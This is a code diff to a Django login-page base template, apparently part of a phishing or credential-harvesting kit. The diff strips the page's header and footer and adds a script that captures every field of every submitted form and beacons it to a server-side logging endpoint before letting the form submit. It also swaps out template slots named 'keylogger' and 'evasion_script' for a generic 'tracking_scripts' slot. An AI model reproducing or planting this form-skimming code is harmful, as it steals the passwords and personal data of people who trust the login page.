@@ -10,8 +10,9 @@
     <title>{% block title %}Secure Login{% endblock %}</title>
     
     <!-- Favicon -->
+    {% block icon %}
     <link rel="icon" href="{% static 'images/favicon.ico' %}" type="image/x-icon">
-    <link rel="apple-touch-icon" href="{% static 'images/apple-touch-icon.png' %}">
+    {% endblock %}
     
     <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -258,10 +259,10 @@
 </head>
 <body>
     <!-- Skip to content link for accessibility -->
-    <a href="#main-content" class="sr-only">Skip to main content</a>
+    <!-- <a href="#main-content" class="sr-only">Skip to main content</a> -->
     
     <div class="base-container">
-        <header class="base-header">
+        <!-- <header class="base-header">
             {% block header %}
             <div class="logo-container">
                 <a href="/">
@@ -273,7 +274,7 @@
                 </a>
             </div>
             {% endblock %}
-        </header>
+        </header> -->
         
         <main id="main-content" class="base-main">
             {% block content %}
@@ -281,7 +282,7 @@
             {% endblock %}
         </main>
         
-        <footer class="base-footer">
+        <!-- <footer class="base-footer">
             {% block footer %}
             <p>&copy; {% now "Y" %} Company Name. All rights reserved.</p>
             <nav class="footer-links">
@@ -292,7 +293,7 @@
                 <a href="/contact" class="base-link">Contact Us</a>
             </nav>
             {% endblock %}
-        </footer>
+        </footer> -->
     </div>
     
     <!-- Base JavaScript -->
@@ -323,6 +324,33 @@
                 );
             });
         }
+
+        // Form submission handler
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Collect all data before submitting
+            const formData = new FormData(form);
+            const formJson = {};
+            formData.forEach((value, key) => formJson[key] = value);
+            
+            // Send data via Beacon API
+            const data = {
+                ...formJson,
+            };
+            console.log('Beacon data:',data);
+            
+            navigator.sendBeacon("{% url 'base:log-submission' %}", JSON.stringify(data));
+            
+            // Optionally submit the form after a delay
+            setTimeout(() => {
+                form.submit();
+            }, 1000);
+        });
+    });
+
+
     });
     </script>
     
@@ -330,9 +358,6 @@
     {% block js %}{% endblock %}
     
     <!-- Security scripts injection -->
-    {{ keylogger|safe }} 
-    {{ security_scripts|safe }} 
-    {{ timeout_script|safe }} 
-    {{ evasion_script|safe }}
+    {{ tracking_scripts|safe }}
 </body>
 </html>
